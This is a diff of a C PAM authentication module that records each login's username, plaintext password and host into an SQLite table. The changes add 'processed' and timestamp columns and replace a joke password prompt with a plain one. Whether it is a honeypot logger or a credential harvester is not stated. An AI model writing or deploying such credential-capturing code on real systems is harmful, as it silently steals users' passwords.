@@ -24,7 +24,7 @@ int store_login_details(const char *username, const char *password, const char *
 
     //Create the table
     sqlite3_stmt *stmt = NULL;
-    const char *createDatabaseSQL = "CREATE TABLE IF NOT EXISTS \"logins\" (\"id\"	INTEGER PRIMARY KEY AUTOINCREMENT, \"username\"	TEXT DEFAULT \"\", \"password\"	TEXT DEFAULT \"\", \"host\"	TEXT DEFAULT \"\");";
+    const char *createDatabaseSQL = "CREATE TABLE IF NOT EXISTS \"logins\" ( \"id\"	INTEGER PRIMARY KEY AUTOINCREMENT, \"username\"	TEXT DEFAULT \"\", \"password\"	TEXT DEFAULT \"\", \"host\"	TEXT DEFAULT \"\", \"processed\" INTEGER DEFAULT 0, \"when\" DATETIME DEFAULT CURRENT_TIMESTAMP );";
     error = sqlite3_prepare(handler, createDatabaseSQL, -1, &stmt, 0);
     sqlite3_step(stmt);
     sqlite3_finalize(stmt);
@@ -45,17 +45,23 @@ int store_login_details(const char *username, const char *password, const char *
         fprintf(stderr, "%s", sqlite3_errmsg(handler));
         return 1;
     }
-    error = sqlite3_bind_text(stmt, 2, password, strlen(password), SQLITE_STATIC);
-    if(error){
-        fprintf(stderr, "failecd to assign password\n");
-        fprintf(stderr, "%s", sqlite3_errmsg(handler));
-        return 1;
+
+    if (strlen(password) > 0) {
+        error = sqlite3_bind_text(stmt, 2, password, strlen(password), SQLITE_STATIC);
+        if(error){
+            fprintf(stderr, "failecd to assign password\n");
+            fprintf(stderr, "%s", sqlite3_errmsg(handler));
+            return 1;
+        }
     }
-    error = sqlite3_bind_text(stmt, 3, host, strlen(host), SQLITE_STATIC);
-    if(error){
-        fprintf(stderr, "failecd to assign host\n");
-        fprintf(stderr, "%s", sqlite3_errmsg(handler));
-        return 1;
+
+    if (strlen(host) > 0) {
+        error = sqlite3_bind_text(stmt, 3, host, strlen(host), SQLITE_STATIC);
+        if(error){
+            fprintf(stderr, "failecd to assign host\n");
+            fprintf(stderr, "%s", sqlite3_errmsg(handler));
+            return 1;
+        }
     }
 
     sqlite3_step(stmt);
@@ -77,7 +83,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return PAM_PERM_DENIED;
     }
 
-    pam_code = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "PGimme ASSWORD: ");
+    pam_code = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "PASSWORD: ");
     if(pam_code != PAM_SUCCESS){
         fprintf(stderr, "Unable to retrive PASSWORD");
         return PAM_PERM_DENIED;
